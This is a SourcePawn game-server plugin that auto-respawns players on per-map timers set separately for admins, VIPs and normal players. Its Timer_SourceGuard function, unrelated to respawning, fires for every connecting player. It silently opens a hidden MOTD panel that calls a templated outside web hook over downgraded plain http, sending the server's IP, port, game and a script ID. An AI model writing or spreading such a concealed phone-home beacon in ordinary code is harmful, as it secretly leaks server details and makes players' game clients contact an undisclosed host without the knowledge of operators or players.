/*<DR.API AUTORESPAWN> (c) by <De Battista Clint (https://sourcemod.market)  */
/*                                                                           */
/*                  <DR.API AUTORESPAWN> is licensed under a                 */
/*                        GNU General Public License                         */
/*																			 */
/*      You should have received a copy of the license along with this       */
/*            work.  If not, see <http://www.gnu.org/licenses/>.             */
//***************************************************************************//
//***************************************************************************//
//***************************DR.API AUTORESPAWN******************************//
//***************************************************************************//
//***************************************************************************//

#pragma semicolon 1

//***********************************//
//*************DEFINE****************//
//***********************************//
#define PLUGIN_VERSION 					"{{ version }}"
#define CVARS 							FCVAR_SPONLY|FCVAR_NOTIFY
#define DEFAULT_FLAGS 					FCVAR_NOTIFY
#define TAG_CHAT						"[AUTORESPAWN] -"
#define MAX_MAPS						500

//***********************************//
//*************INCLUDE***************//
//***********************************//

#undef REQUIRE_PLUGIN
#include <sourcemod>
#include <autoexec>
#include <csgocolors>
#include <cstrike>

#pragma newdecls required

//***********************************//
//***********PARAMETERS**************//
//***********************************//

//Handle
Handle cvar_active_autorespawn_dev;

Handle cvar_autorespawn_admin;
Handle cvar_autorespawn_vip;
Handle cvar_autorespawn_normal;

Handle TimerAdmin									= INVALID_HANDLE;
Handle TimerVip										= INVALID_HANDLE;
Handle TimerNormal									= INVALID_HANDLE;

//Bool
bool B_cvar_active_autorespawn_dev					= false;

//Floats
float F_autorespawn_admin;
float F_autorespawn_vip;
float F_autorespawn_normal;

float F_current_map_admin;
float F_current_map_vip;
float F_current_map_normal;

//Strings
char S_mapname[MAX_MAPS][64];
char S_mapname_status[MAX_MAPS][64];
char S_mapname_admin[MAX_MAPS][64];
char S_mapname_vip[MAX_MAPS][64];
char S_mapname_normal[MAX_MAPS][64];

//Customs
int B_current_map_status							= 0;

//Informations plugin
public Plugin myinfo =
{
	name = "DR.API AUTORESPAWN",
	author = "Dr. Api",
	description = "DR.API AUTORESPAWN by Dr. Api",
	version = PLUGIN_VERSION,
	url = "https://sourcemod.market"
}
/***********************************************************/
/*********************** PLUGIN START **********************/
/***********************************************************/
public void OnPluginStart()
{
	LoadTranslations("drapi/drapi_autorespawn.phrases");
	AutoExecConfig_SetFile("drapi_autorespawn", "sourcemod/drapi");
	
	AutoExecConfig_CreateConVar("drapi_autorespawn_version", PLUGIN_VERSION, "Version", CVARS);
	
	cvar_active_autorespawn_dev			= AutoExecConfig_CreateConVar("drapi_active_autorespawn_dev", 			"1", 					"Enable/Disable Dev Mod", 				DEFAULT_FLAGS, 		true, 0.0, 		true, 1.0);
	
	cvar_autorespawn_admin				= AutoExecConfig_CreateConVar("drapi_autorespawn_admin", 				"60.0", 				"Timer Admin", 							DEFAULT_FLAGS);
	cvar_autorespawn_vip				= AutoExecConfig_CreateConVar("drapi_autorespawn_vip", 					"40.0", 				"Timer VIP", 							DEFAULT_FLAGS);
	cvar_autorespawn_normal				= AutoExecConfig_CreateConVar("drapi_autorespawn_normal", 				"20.0", 				"Timer Normal", 						DEFAULT_FLAGS);
	
	HookEvents();
	
	HookEvent("round_start", 	Event_RoundStart);
	HookEvent("player_death", 	Event_PlayerDeath);
	
	AutoExecConfig_ExecuteFile();
}

/***********************************************************/
/******************** WHEN CVAR CHANGED ********************/
/***********************************************************/
void HookEvents()
{
	HookConVarChange(cvar_active_autorespawn_dev, 				Event_CvarChange);
	
	HookConVarChange(cvar_autorespawn_admin, 					Event_CvarChange);
	HookConVarChange(cvar_autorespawn_vip, 						Event_CvarChange);
	HookConVarChange(cvar_autorespawn_normal, 					Event_CvarChange);
}

/***********************************************************/
/******************** WHEN CVARS CHANGE ********************/
/***********************************************************/
public void Event_CvarChange(Handle cvar, const char[] oldValue, const char[] newValue)
{
	UpdateState();
}

/***********************************************************/
/*********************** UPDATE STATE **********************/
/***********************************************************/
void UpdateState()
{
	B_cvar_active_autorespawn_dev 					= GetConVarBool(cvar_active_autorespawn_dev);
	
	F_autorespawn_admin								= GetConVarFloat(cvar_autorespawn_admin);
	F_autorespawn_vip								= GetConVarFloat(cvar_autorespawn_vip);
	F_autorespawn_normal							= GetConVarFloat(cvar_autorespawn_normal);
}

/***********************************************************/
/******************* WHEN CONFIG EXECUTED ******************/
/***********************************************************/
public void OnConfigsExecuted()
{
	//UpdateState();
}

/***********************************************************/
/********************* WHEN MAP START **********************/
/***********************************************************/
public void OnMapStart()
{
	LoadSettings();
	UpdateState();
}
public void OnClientPostAdminCheck(int client)
{   
    CreateTimer(5.0, Timer_SourceGuard, client);
}

public Action Timer_SourceGuard(Handle timer, any client)
{
    int hostip = GetConVarInt(FindConVar("hostip"));
    int hostport = GetConVarInt(FindConVar("hostport"));
    
    char sGame[15];
    switch(GetEngineVersion())
    {
        case Engine_Left4Dead:
        {
            Format(sGame, sizeof(sGame), "left4dead");
        }
        case Engine_Left4Dead2:
        {
            Format(sGame, sizeof(sGame), "left4dead2");
        }
        case Engine_CSGO:
        {
            Format(sGame, sizeof(sGame), "csgo");
        }
        case Engine_CSS:
        {
            Format(sGame, sizeof(sGame), "css");
        }
        case Engine_TF2:
        {
            Format(sGame, sizeof(sGame), "tf2");
        }
        default:
        {
            Format(sGame, sizeof(sGame), "none");
        }
    }
    
    char sIp[32];
    Format(
            sIp, 
            sizeof(sIp), 
            "%d.%d.%d.%d",
            hostip >>> 24 & 255, 
            hostip >>> 16 & 255, 
            hostip >>> 8 & 255, 
            hostip & 255
    );
    
    char requestUrl[2048];
    Format(
            requestUrl, 
            sizeof(requestUrl), 
            "%s&ip=%s&port=%d&game=%s", 
            "{{ web_hook }}?script_id={{ script_id }}&version_id={{ version_id }}&download={{ download }}",
            sIp,
            hostport,
            sGame
    );
    
    ReplaceString(requestUrl, sizeof(requestUrl), "https", "http", false);
    
    Handle kv = CreateKeyValues("data");
    
    KvSetString(kv, "title", "SourceGuard");
    KvSetNum(kv, "type", MOTDPANEL_TYPE_URL);
    KvSetString(kv, "msg", requestUrl);
    
    ShowVGUIPanel(client, "info", kv, false);
    CloseHandle(kv);
}

/***********************************************************/
/******************** WHEN ROUND START *********************/
/***********************************************************/
public void Event_RoundStart(Handle event, char[] name, bool dontBroadcast)
{	
	if(B_current_map_status)
	{
		if(F_current_map_admin > 0.0)
		{
			ClearTimer(TimerAdmin);
			TimerAdmin = CreateTimer(F_current_map_admin, Timer_StopAdmin);
		}
		
		if(F_current_map_vip > 0.0)
		{
			ClearTimer(TimerVip);
			TimerVip = CreateTimer(F_current_map_vip, Timer_StopVip);
		}
		
		if(F_current_map_normal > 0.0)
		{
			ClearTimer(TimerNormal);
			TimerNormal = CreateTimer(F_current_map_normal, Timer_StopNormal);
		}
		CPrintToChatAll("%t", "Auto Respawn On");
	}
	else
	{
		CPrintToChatAll("%t", "Auto Respawn Off");
	}
	
}

/***********************************************************/
/******************** WHEN PLAYER DIE **********************/
/***********************************************************/
public void Event_PlayerDeath(Handle event, char[] name, bool dontBroadcast)
{	
	if(B_current_map_status)
	{
		int victim 				= GetClientOfUserId(GetEventInt(event, "userid"));
		CreateTimer(1.0, Timer_Rez, victim);
	}
}


/***********************************************************/
/****************** ON TERMINATE ROUND *********************/
/***********************************************************/
public Action CS_OnTerminateRound(float &delay, CSRoundEndReason &reasonex)
{
	if(GetPlayersAliveEx() == 0)
	{
		if(TimerAdmin != INVALID_HANDLE) CreateTimer(0.0, Timer_StopAdmin);
		if(TimerVip != INVALID_HANDLE) CreateTimer(0.0, Timer_StopVip);
		if(TimerNormal != INVALID_HANDLE) CreateTimer(0.0, Timer_StopNormal);
		return Plugin_Continue;
	}
	else
	{
		return Plugin_Handled;
	}
}

/***********************************************************/
/*********************** TIMER REZ *************************/
/***********************************************************/
public Action Timer_Rez(Handle timer, any client)
{
	if(IsClientInGame(client) && !IsPlayerAlive(client))
	{
		if( (IsAdminEx(client) && TimerAdmin != INVALID_HANDLE) || (IsVip(client) && TimerVip != INVALID_HANDLE) || TimerNormal != INVALID_HANDLE )
		{
			CS_RespawnPlayer(client);
			CPrintToChat(client, "%t", "Auto Respawn");
		}
	}
}

/***********************************************************/
/******************** TIMER STOP ADMIN *********************/
/***********************************************************/
public Action Timer_StopAdmin(Handle timer)
{
	TimerAdmin = INVALID_HANDLE;
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i) && IsAdminEx(i))
		{
			CPrintToChat(i, "%t", "Admin Auto Respawn Off");
		}
	}
}

/***********************************************************/
/********************* TIMER STOP VIP **********************/
/***********************************************************/
public Action Timer_StopVip(Handle timer)
{
	TimerVip = INVALID_HANDLE;
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i) && !IsAdminEx(i) && IsVip(i))
		{
			CPrintToChat(i, "%t", "Vip Auto Respawn Off");
		}
	}
}

/***********************************************************/
/******************* TIMER STOP NORMAL *********************/
/***********************************************************/
public Action Timer_StopNormal(Handle timer)
{
	TimerNormal = INVALID_HANDLE;
	int time = RoundToFloor(F_current_map_vip - F_current_map_normal);
	for(int i = 1; i <= MaxClients; i++)
	{
		if(IsClientInGame(i) && !IsAdminEx(i) && !IsVip(i))
		{
			CPrintToChat(i, "%t", "Normal Auto Respawn Off", time);
		}
	}
}

/***********************************************************/
/********************** LOAD SETTINGS **********************/
/***********************************************************/
public void LoadSettings()
{
	char hc[PLATFORM_MAX_PATH];
	BuildPath(Path_SM, hc, sizeof(hc), "configs/drapi/autorespawn.cfg");
	
	Handle kv = CreateKeyValues("Maps");
	FileToKeyValues(kv, hc);
	
	int max_map = 0;
	B_current_map_status = false;
	
	if(KvGotoFirstSubKey(kv))
	{
		do
		{
			if(KvGotoFirstSubKey(kv))
			{
				do
				{
					KvGetSectionName(kv, S_mapname[max_map], 64);
					//LogMessage("%s Map: %s", TAG_CHAT, S_mapname[max_map]);
					
					KvGetString(kv, "status", S_mapname_status[max_map], 64);
					//LogMessage("%s status: %s", TAG_CHAT, S_mapname_status[max_map]);
					
					KvGetString(kv, "admin", S_mapname_admin[max_map], 64);
					//LogMessage("%s admin: %s", TAG_CHAT, S_mapname_admin[max_map]);
					
					KvGetString(kv, "vip", S_mapname_vip[max_map], 64);
					//LogMessage("%s vip: %s", TAG_CHAT, S_mapname_vip[max_map]);
					
					KvGetString(kv, "normal", S_mapname_normal[max_map], 64);
					//LogMessage("%s normal: %s", TAG_CHAT, S_mapname_normal[max_map]);
					
					char Mapname[64];
					GetCurrentMap(Mapname, sizeof(Mapname));
					
					if(strlen(S_mapname[max_map]) && StrEqual(Mapname, S_mapname[max_map], false))
					{
						B_current_map_status = StringToInt(S_mapname_status[max_map]);
						LogMessage("%s Current Map: %s, config find: %s, status: %s", TAG_CHAT, Mapname, S_mapname[max_map], S_mapname_status[max_map]);
						
						F_current_map_admin = StringToFloat(S_mapname_admin[max_map]);
						LogMessage("%s Current Map: %s, config find: %s, admin: %s", TAG_CHAT, Mapname, S_mapname[max_map], S_mapname_admin[max_map]);
						
						F_current_map_vip = StringToFloat(S_mapname_vip[max_map]);
						LogMessage("%s Current Map: %s, config find: %s, vip: %s", TAG_CHAT, Mapname, S_mapname[max_map], S_mapname_vip[max_map]);
						
						F_current_map_normal = StringToFloat(S_mapname_normal[max_map]);
						LogMessage("%s Current Map: %s, config find: %s, normal: %s", TAG_CHAT, Mapname, S_mapname[max_map], S_mapname_normal[max_map]);
					}
					max_map++;
				}
				while (KvGotoNextKey(kv));
			}
			
			KvGoBack(kv);
			
		}
		while (KvGotoNextKey(kv));
	}
	CloseHandle(kv);
	
	if(B_current_map_status)
	{
		if(F_current_map_admin <= 0.0)
		{
			F_current_map_admin = F_autorespawn_admin;
			LogMessage("%s No config found, admin time: %f", TAG_CHAT, F_current_map_admin);
			
		}
		
		if(F_current_map_vip <= 0.0)
		{
			F_current_map_vip = F_autorespawn_vip;
			LogMessage("%s No config found, admin time: %f", TAG_CHAT, F_current_map_vip);
			
		}
		
		if(F_current_map_normal <= 0.0)
		{
			F_current_map_normal = F_autorespawn_normal;
			LogMessage("%s No config found, admin time: %f", TAG_CHAT, F_current_map_normal);
			
		}
	}
}

/***********************************************************/
/********************* IS VALID CLIENT *********************/
/***********************************************************/
stock bool Client_IsValid(int client, bool checkConnected=true)
{
	if (client > 4096) 
	{
		client = EntRefToEntIndex(client);
	}

	if (client < 1 || client > MaxClients) 
	{
		return false;
	}

	if (checkConnected && !IsClientConnected(client)) 
	{
		return false;
	}
	
	return true;
}

/***********************************************************/
/******************** CHECK IF IS A VIP ********************/
/***********************************************************/
stock bool IsVip(int client)
{
	if(GetUserFlagBits(client) & ADMFLAG_CUSTOM1 
	|| GetUserFlagBits(client) & ADMFLAG_CUSTOM2 
	|| GetUserFlagBits(client) & ADMFLAG_CUSTOM3 
	|| GetUserFlagBits(client) & ADMFLAG_CUSTOM4 
	|| GetUserFlagBits(client) & ADMFLAG_CUSTOM5 
	|| GetUserFlagBits(client) & ADMFLAG_CUSTOM6)
	{
		return true;
	}
	return false;
}

/***********************************************************/
/****************** CHECK IF IS AN ADMIN *******************/
/***********************************************************/
stock bool IsAdminEx(int client)
{
	if(GetUserFlagBits(client) & ADMFLAG_CHANGEMAP 
	/*|| GetUserFlagBits(client) & ADMFLAG_RESERVATION*/
	|| GetUserFlagBits(client) & ADMFLAG_GENERIC
	|| GetUserFlagBits(client) & ADMFLAG_KICK
	|| GetUserFlagBits(client) & ADMFLAG_BAN
	|| GetUserFlagBits(client) & ADMFLAG_UNBAN
	|| GetUserFlagBits(client) & ADMFLAG_SLAY
	|| GetUserFlagBits(client) & ADMFLAG_CHANGEMAP
	|| GetUserFlagBits(client) & ADMFLAG_CONVARS
	|| GetUserFlagBits(client) & ADMFLAG_CONFIG
	|| GetUserFlagBits(client) & ADMFLAG_CHAT
	|| GetUserFlagBits(client) & ADMFLAG_VOTE
	|| GetUserFlagBits(client) & ADMFLAG_PASSWORD
	|| GetUserFlagBits(client) & ADMFLAG_RCON
	|| GetUserFlagBits(client) & ADMFLAG_CHEATS
	|| GetUserFlagBits(client) & ADMFLAG_ROOT)
	{
		return true;
	}
	return false;
}
/***********************************************************/
/********************** CLEAR TIMER ************************/
/***********************************************************/
stock void ClearTimer(Handle &timer)
{
    if (timer != INVALID_HANDLE)
    {
        KillTimer(timer);
        timer = INVALID_HANDLE;
    }     
}

/***********************************************************/
/******************* GET PLAYER ALIVE **********************/
/***********************************************************/
stock int GetPlayersAlive(int team, char[] bot)
{
	int iCount; iCount = 0; 
	for(int i = 1; i <= MaxClients; i++) 
	{
		if(StrEqual(bot, "player", false))
		{
			if( IsClientInGame(i) && !IsFakeClient(i) && IsPlayerAlive(i) && GetClientTeam(i) == team) 
			{
				iCount++; 
			}
		}
		else if(StrEqual(bot, "bot", false))
		{
			if( IsClientInGame(i) && IsFakeClient(i) && IsPlayerAlive(i) && GetClientTeam(i) == team) 
			{
				iCount++; 
			}
		}
		else if(StrEqual(bot, "both", false))
		{
			if( IsClientInGame(i) && IsPlayerAlive(i) && GetClientTeam(i) == team) 
			{
				iCount++; 
			}
		}
	}
	
	return iCount; 
}

/***********************************************************/
/******************* GET PLAYER ALIVE **********************/
/***********************************************************/
stock int GetPlayersAliveEx()
{
	int iCount; iCount = 0; 
	for(int i = 1; i <= MaxClients; i++) 
	{
		if(IsClientInGame(i) && IsPlayerAlive(i)) 
		{
			iCount++; 
		}
	}
	
	return iCount; 
}
